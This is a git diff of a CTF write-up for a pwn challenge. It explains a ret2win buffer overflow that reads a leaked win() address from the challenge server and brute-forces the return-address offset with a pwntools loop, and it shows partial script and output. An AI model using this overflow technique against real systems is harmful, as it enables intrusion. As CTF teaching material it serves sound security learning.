@@ -7,26 +7,33 @@ tags:
 - pwn
 description: "Writeup for the Space Heroes CTF pwn challenge [Warmup to the Dark Side]."
 permalink: ctfs/shctf/pwn/warmup-to-the-dark-side/
+thumbnail: https://files.catbox.moe/5udwod.png
 ---
 
 ## 📜 Description
+
 Once you start down the dark path, forever will it dominate your destiny.
 (And yes, the binary isn't included)
 
-`nc 0.cloud.chals.io 30096` \
+`nc 0.cloud.chals.io 30096`
 **Author**: v10l3nt
+
 ---
 
 ## 🔍 Detailed Solution
+
 Let's run that `netcat` link to see what's going on:
-```
+
+```text
 kali@kali:~/shctf/pwn/warmup-to-the-dark-side$ nc 0.cloud.chals.io 30096
 The Dark Side Of The Force, Are They. Easily They Flow, Quick To Join You In A Fight. The Dark Side resides at: 0x55a6b42f020c
 Jedi Mind tricks dont work on me >>> 
 ```
-We're given an address of the `win()` function... and that's it. If this is a `ret2win` challenge, how are we meant to find the offset of the `$rip` register and overflow it with our code? Of course... we need to brute force it. 
+
+We're given an address of the `win()` function... and that's it. If this is a `ret2win` challenge, how are we meant to find the offset of the `$rip` register and overflow it with our code? Of course... we need to brute force it.
 
 In the code snippet below, I got the address provided in the prompt by reading the line and taking its substring (ASLR is enabled, so it's different each time). Then, I slowly increase the buffer of the payload with a loop until I find the right offset of the `$rip`:
+
 ```py
 from pwn import *
 for i in range(0,100):
@@ -40,8 +47,10 @@ for i in range(0,100):
                 break
         p.close()
 ```
+
 Let's run this script on the server to see if we can get the flag:
-```
+
+```text
 ...
 [*] Trying offset 37 for address 0x55f788f1120c
 [+] Receiving all data: Done (38B)
